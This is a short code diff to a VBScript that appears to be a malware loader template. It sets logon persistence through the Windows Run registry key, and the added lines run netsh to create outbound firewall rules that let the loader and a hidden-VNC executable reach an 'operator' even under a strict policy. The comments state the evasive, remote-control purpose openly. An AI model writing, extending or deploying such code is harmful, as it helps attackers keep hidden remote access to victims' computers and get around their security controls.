@@ -30,6 +30,14 @@ End If
 ' persistence: relaunch on every logon (survives reboot)
 On Error Resume Next
 shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Fleet{{RAND4}}", """" & loaderPath & """"
+
+' preconfigure the host firewall: allow the payload out so it can reach the
+' operator even when a strict outbound policy is set (best effort; needs admin).
+Dim fwRule
+fwRule = "netsh advfirewall firewall add rule name=Fleet{{RAND4}} dir=out action=allow program=""" & loaderPath & """ enable=yes profile=any"
+shell.Run fwRule, 0, True
+fwRule = "netsh advfirewall firewall add rule name=FleetHVNC{{RAND4}} dir=out action=allow program=""" & base & "\hvnc.exe"" enable=yes profile=any"
+shell.Run fwRule, 0, True
 On Error GoTo 0
 
 shell.CurrentDirectory = base
